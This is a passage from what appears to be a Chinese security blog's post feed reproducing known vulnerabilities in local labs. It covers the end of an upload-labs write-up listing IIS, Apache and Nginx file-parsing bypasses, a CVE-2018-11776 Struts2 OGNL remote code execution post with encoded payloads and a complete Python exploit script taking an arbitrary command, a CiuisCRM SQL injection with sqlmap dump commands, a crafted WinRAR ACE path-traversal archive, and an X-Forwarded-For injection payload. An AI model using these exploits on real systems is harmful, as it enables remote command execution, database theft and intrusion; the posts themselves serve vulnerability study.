title="Pass-20（代码审计）"></a>Pass-20（代码审计）</h2><p>这个题目用了数组+/.的方式去绕过，因为源代码里面含有这样的两句代码，成了关键得绕过的地方</p><pre><code>if (!is_array($file)) {                    $file = explode(&#39;.&#39;, strtolower($file));                }</code></pre><pre><code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code></pre><p>这同样我们就需要满足两个条件，第一个是先得保证另外修改的名字需要满足是数组的条件，所以我们可以抓包构造数组，<br>第二点由于后面filename构成的过程中由于<code>$file[count($file) - 1]</code>的作用，导致<code>$file[1] = NULL</code>，所以构造文件名后相当于直接就是<code>xx.php/.</code>，<br>根据上面一题的知识，可以直接在<code>move_uploaded_file</code>函数的作用下可以将/.忽略，因此还是可以上传成功的。<br>因此<code>save_name</code>变量的两个值分别是<code>xx.php/</code>，另外一个值是<code>jpg</code>，其实从代码审计的角度上看，还是可控变量导致这样的后果</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805123452.png" alt></p><hr><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><h2 id="upload-labs总结"><a href="#upload-labs总结" class="headerlink" title="upload-labs总结"></a>upload-labs总结</h2><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805134449.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190805134922.png" alt></p><p>其中有一些漏洞因为环境原因，没能成功解析执行。<br>顺便在总结一下其他中间件问题导致的解析漏洞</p><h2 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h2><p>IIS 6.0解析利用方法有三种：<br>1.目录解析<br>建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析<br>2.文件解析<br>后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)<br>3.默认解析<br>IIS6.0 默认的可执行文件除了asp还包含这三种</p><pre><code>/xxx.asa/xxx.cer/xxx.cdx/xxx.apsx</code></pre><h2 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h2><p>在正常图片URL后添加 /.php，可以解析为php</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全</p><p>后缀解析：test.php.x1.x2.x3<br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析<br>test.php.x1.x2.x3则会被解析为php</p><p>apache 2.1.x的版本就可以用test.php.jpg直接就可以getshell了</p><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>Nginx &lt;8.03畸形解析漏洞<br>直接在正常图片URL后添加/.php<br>Nginx &lt;=0.8.37<br>在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p><p>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/4029" target="_blank" rel="noopener">Upload-labs 20关通关笔记</a><br><a href="https://blog.csdn.net/u011377996/article/details/86776198" target="_blank" rel="noopener">upload-labs刷关记录</a><br><a href="http://poetichacker.com/writeup/从upload-labs总结上传漏洞及其绕过.html" target="_blank" rel="noopener">从upload-labs总结上传漏洞及其绕过 </a><br><a href="https://www.smi1e.top/文件解析漏洞总结/" target="_blank" rel="noopener">文件解析漏洞总结</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> dcoker </tag>
            
            <tag> upload-labs </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-11776漏洞复现</title>
      <link href="/2019/08/02/cve-2018-11776-lou-dong-fu-xian/"/>
      <url>/2019/08/02/cve-2018-11776-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>2018年8月23日，ApacheStrust2发布最新安全公告，ApacheStruts2 存在远程代码执行的高危漏洞，该漏洞由SemmleSecurity Researchteam的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）。</p><p>定义XML配置时如果namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace时可能会导致远程代码执行。<br>URL标签未设置value和action值且上层动作未设置或用通配符namespace时可能会导致远程代码执行，以及系统命令到服务器系统中去 。</p><hr><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>Apache struts 2.3-Apache struts 2.3.34</p><p>Apache struts 2.5-Apache struts 2.5.16 </p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li>windows 10</li><li>jdk1.8.0_191</li><li>apache-tomcat-7.0.96</li><li>struts-2.3.34</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先安装jdk，并配置环境变量，不再赘述</p><p>下载 <a href="https://tomcat.apache.org/download-70.cgi" target="_blank" rel="noopener">apache-tomcat</a> 并解压<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802122817.png" alt></p><p>下载 <a href="http://archive.apache.org/dist/struts/2.3.34/" target="_blank" rel="noopener">Struts-2.3.34</a> 解压，并将apps目录下的 <code>struts2-showcase.war</code> 复制到tomcat的webapps目录下<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123100.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123449.png" alt></p><p>在tomcat下bin目录下运行startup.bat脚本来启动tomcat，启动后自动部署struts2<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123719.png" alt></p><p>浏览器访问 <code>http://127.0.0.1:8080/struts2-showcase</code>，出现如下界面即为部署成功了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123957.png" alt></p><p>正常部署完成struts如上所示，但为了复现struts2-057漏洞，需要修改如下两个文件（tomcat目录下）</p><ul><li>D:\Program Files\Java\apache-tomcat-7.0.96\webapps\struts2-showcase\WEB-INF\src\java\struts-actionchaining.xml</li><li>D:\Program Files\Java\apache-tomcat-7.0.96\webapps\struts2-showcase\WEB-INF\classes\struts-actionchaining.xml</li></ul><p>注释掉原来的xml代码，修改如下<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802124843.png" alt></p><pre><code>&lt;struts&gt;    &lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt;        &lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;            &lt;result type=&quot;redirectAction&quot;&gt;            &lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt;            &lt;/result&gt;            &lt;/action&gt;        &lt;action name=&quot;actionChain2&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain2&quot;&gt;            &lt;result type=&quot;chain&quot;&gt;actionChain3&lt;/result&gt;        &lt;/action&gt;        &lt;action name=&quot;actionChain3&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain3&quot;&gt;            &lt;result&gt;/WEB-INF/actionchaining/actionChainingResult.jsp&lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;&lt;/struts&gt;</code></pre><p>在tomcat下bin目录下运行shutdown.bat，startup.bat脚本来重启tomcat。<br><strong>重启tomcat！！！</strong><br><strong>重启tomcat！！！</strong><br><strong>重启tomcat！！！</strong><br>浏览器访问<code>http://192.168.10.230:8080/struts2-showcase/</code>,漏洞环境成功搭建</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在URL构造ognl表达式，再加上配置文件中的action标签中的name属性值，并以.action结尾<br><code>http://127.0.0.1:8080/struts2-showcase/${(50+50)}/actionChain1.action</code><br>执行完成之后发现跳转到了<br><code>http://127.0.0.1:8080/struts2-showcase/100/register2.action</code><br>执行了ognl 表达式 ${(50+50)},漏洞存在</p><p>进一步利用漏洞，弹出计算器，构造payload</p><pre><code>${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))}</code></pre><p>进行URL编码 </p><pre><code>%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d</code></pre><p>拼接</p><pre><code>127.0.0.1:8080/struts2-showcase/%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d/actionChain1.action</code></pre><p>成功执行<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802131043.png" alt></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#coding: utf-8import requestsimport sysdef expliot(host, command, path):    &#39;&#39;&#39;    2.3.34版本    payload1:    ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}    2.3.20版本    payload2:    ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}    &#39;&#39;&#39;    str1 = &quot;${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot;+command+&quot;&#39;).getInputStream()))).(#w.close())}&quot;    str1 = str1.encode(&#39;hex&#39;)    str2 = &quot;${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot;+command+&quot;&#39;).getInputStream()))).(#w.close())}&quot;    str2 = str2.encode(&#39;hex&#39;)    #需要进行URL编码    payload1 = &quot;&quot;    for i in range(0,len(str1),2):        payload1 += &#39;%&#39;+str1[i:i+2]    payload2 = &quot;&quot;    for i in range(0,len(str2),2):        payload2 += &#39;%&#39;+str2[i:i+2]    url1 = host+&#39;/&#39;+payload1+&#39;/&#39;+path    url2 = host+&#39;/&#39;+payload2+&#39;/&#39;+path    res1 = requests.get(url1, allow_redirects=False)    res2 = requests.get(url2, allow_redirects=False)    if res1.status_code == 200 and res2.status_code != 200:        print &quot;Exploit successful:&quot;    print res1.content    elif res2.status_code == 200 and res1.status_code != 200:    print &quot;Exploit successful:&quot;    print res2.content    else:    print(&#39;The target is likely unvulnerable,mabye your struts2 version is too high!&#39;)if __name__ == &#39;__main__&#39;:    if len(sys.argv) &lt; 4:        print(&quot;Usage: python2 struts2.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}&quot;)    else:        expliot(sys.argv[1].strip(), sys.argv[2], sys.argv[3].strip())</code></pre><p>使用方法：</p><p><code>python2 struts2.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}</code></p><p>例如:<br><code>python2 struts2.py http://192.168.50.197:8080/struts2-showcase/ &quot;ipconfig&quot; actionChain1.action</code></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://www.cuittk.cn/2019/01/02/CVE-2018-11776漏洞从搭建到复现/" target="_blank" rel="noopener">CVE-2018-11776漏洞从搭建到复现</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> CVE-2018-11776 </tag>
            
            <tag> struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ciuis CRM 1.6 - &#39;eventType&#39; SQL Inj.复现</title>
      <link href="/2019/08/01/ciuiscrm-1.6-eventtype-sql-inj.fu-xian/"/>
      <url>/2019/08/01/ciuiscrm-1.6-eventtype-sql-inj.fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h1><pre><code>===========================================================================================# Exploit Title: CiuisCRM 1.6 - &#39;eventType&#39; SQL Inj.# Dork: N/A# Date: 27-05-2019# Exploit Author: Mehmet EMİROĞLU# Vendor Homepage: https://codecanyon.net/item/ciuis-crm/20473489# Software Link: https://codecanyon.net/item/ciuis-crm/20473489# Version: v1.6# Category: Webapps# Tested on: Wamp64, Windows# CVE: N/A# Software Description: Ciuis CRM you can easily manage your customer relationships and save time on your business.===========================================================================================# POC - SQLi# Parameters : eventType# Attack Pattern :-1+or+1%3d1+and(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)# POST Method : http://localhost/ciuiscrm-16/calendar/addevent===========================================================================================</code></pre><hr><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>下载Ciuis CRM 1.6，搭建本地环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175019.png" alt></p><p>点击CALENDAR，然后点添加按钮<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175107.png" alt></p><p>随便填入东西，使用burpsuite抓包<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175408.png" alt></p><p>在<code>eventType=1</code>后面添加单引号，发包，出现报错信息，存在注入点<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175628.png" alt></p><p>将请求信息保存下来（ciuis.txt）用sqlmap跑</p><p><code>python sqlmap.py -r F:\Desktop\ciuis.txt</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181356.png" alt></p><p>查数据库<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt --dbs</code></p><p>查表<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis --tables</code></p><p>查字段<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis -T tags --columns</code></p><p>dump出指定字段<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis -T tags -C id,password --dump</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181516.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181614.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://exploit.kitploit.com/2019/07/ciuiscrm-16-sql-injection.html" target="_blank" rel="noopener">CiuisCRM 1.6 SQL Injection</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> Ciuis CRM 1.6 </tag>
            
            <tag> SQL Inj. </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinRAR目录穿越漏洞复现</title>
      <link href="/2019/07/26/winrar-mu-lu-chuan-yue-lou-dong-fu-xian/"/>
      <url>/2019/07/26/winrar-mu-lu-chuan-yue-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，<br>没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。<br>而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，<br>将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。</p><hr><h1 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h1><p><strong>影响版本：</strong><br>       * WinRAR &lt; 5.70 Beta 1<br>       * Bandizip &lt; = 6.2.0.0<br>       * 好压(2345压缩) &lt; = 5.9.8.10907<br>       * 360压缩 &lt; = 4.0.0.1170<br>       * ……</p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p>新建一个任意文件，名称类型内容随意<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726155542.png" alt></p><p>使用Winace进行压缩<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726155906.png" alt></p><p>然后下载<a href="https://github.com/droe/acefile/blob/master/acefile.py" target="_blank" rel="noopener">acefile.py</a>脚本<br>输入命令<code>python acefile.py --headers test.ace</code> 读取文件的头部信息<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726160308.png" alt></p><p>ok，开始构造恶意文件<br>用 010Editor 打开test.ace文件<br>需要修改以下参数：</p><ul><li>hdr_crc</li><li>hdr_size</li><li>filename的长度</li><li>filename<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726160517.png" alt><br>首先将filename的值改为 <code>d:\d:\liehu.txt</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161040.png" alt></li></ul><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161237.png" alt></p><p>修改后的filename的长度，选中它，左下角就是它的长度15，16进制为00 0F，filename的前两位就是它的长度<br>修改顺序是由后到前，即将10改为0F即可<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161841.png" alt></p><p>修改<strong>hdr_size</strong>，选中如下位置，左下角查看其长度，这里是（00 2E），选中的前面的红框就是hdr_size<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162147.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162439.png" alt></p><p>最后修改<strong>hdr_crc</strong>，再次运行<br><code>python acefile.py --headers test.ace</code><br>CRC校验失败，报错<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162831.png" alt><br>在acefile.py文件中查找 <code>header CRC failed</code><br>在其上面一行添加输出语句，输出ace_crc16(buf)，即为我们需要的<strong>hdr_crc</strong>的值<br><code>print (ace_crc16(buf), buf)</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726163206.png" alt></p><p>改好保存，再次运行<br><code>python acefile.py --headers test.ace</code><br>31102即我们需要的值，转换成16进制为79 7E<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726163625.png" alt></p><p>将<strong>hdr_size</strong> 前面的两位即为<strong>hdr_crc</strong>，从右到左修改为79 7E<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726164206.png" alt></p><p>再次运行<br><code>python acefile.py --headers test.ace</code><br>输出如下信息无报错，就成功了，用开头所述解压工具解压test.ace，就会在红框的路径生成对应的文件。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726164506.png" alt></p><hr><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ol><li>升级最新的WinRAR ，目前版本是 5.71 </li><li>winRAR安装目录下，删除UNACEV2.dll文件</li></ol><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://fuping.site/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/" target="_blank" rel="noopener">WinRAR漏洞复现过程</a><br><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">Extracting a 19 Year Old Code Execution from WinRAR - Check Point Research</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> WinRAR </tag>
            
            <tag> 目录穿越 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树洞外链X_FORWARDED_FOR注入漏洞复现</title>
      <link href="/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/"/>
      <url>/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>树洞外链现在已经停止更新，作者又开发了<a href="https://github.com/cloudreve/Cloudreve" target="_blank" rel="noopener">Cloudreve</a>，有兴趣可以了解一下。<br>回归正题，虽然树洞已经停止更新了，还是可以做一些研究学习。<br>树洞外链存在X_FORWARDED_FOR注入漏洞，最新版本的已经修复了，2.2.1版本的可以复现。</p><hr><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><p>在<code>/includes/function.php</code>的37行左右，获取了X_FORWARDED_FOR，并未做防注入过滤 </p><pre><code>function get_real_ip(){$ip=false;if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;])){$ip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];}if (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {$ips = explode (&quot;, &quot;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }for ($i = 0; $i &lt; count($ips); $i++) {if (!eregi (&quot;^(10|172\.16|192\.168)\.&quot;, $ips[$i])) {$ip = $ips[$i];break;}}}return ($ip ? $ip : $_SERVER[&#39;REMOTE_ADDR&#39;]);}</code></pre><p>然后在<code>includes/save.php</code>  20行左右发现调用<code>get_real_ip()</code>函数</p><pre><code>$ip=get_real_ip();$dd=date(&#39;Y-m-d H:i:s&#39;);$rand = md5(time() . mt_rand(0,1000));$stmt = $con-&gt;prepare(&quot;INSERT INTO  `$sqlname`.`sd_file` (`ming` ,`key1` ,`uploadip` ,`uploadtime` ,`cishuo` ,`upuser` ,`policyid`)VALUES (?, &#39;$rand&#39;, &#39;$ip&#39;, &#39;$dd&#39;, &#39;0&#39; , &#39;$uploadUser&#39;, &#39;$policyId&#39;);&quot;);$stmt-&gt;bind_param(&#39;s&#39;, $ming);</code></pre><hr><h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><p>下载树洞外链源码，本地搭建环境。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726110921.png" alt></p><p>注册账号登陆，然后打开burpsuite，关掉拦截<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111147.png" alt><br>然后上传文件，在HTTP history里找到<code>/includes/save.php</code>,发送到Repeater<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111306.png" alt><br>构造payload并发送</p><pre><code>X-Forwarded-For: 1.1.1.1′,user(),’0′,1,1); #ming=aa</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111644.png" alt></p><p>然后在<strong>我的文件</strong>里面可以看到执行结果<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111744.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/179363.html" target="_blank" rel="noopener">代码审计树洞X_FORWARDED_FOR注入</a><br><a href="https://blog.csdn.net/qq_21510303/article/details/91886405" target="_blank" rel="noopener">代码审计之头部注入X-Forwarded-For</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> 树洞外链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zzzphp V1.6.1 远程代码执行漏洞复现</title>
      <link href="/2019/07/24/zzzphp-v1.6.1-yuan-cheng-dai-ma-zhi-xing-lou-dong-fen-xi-fu-xian/"/>
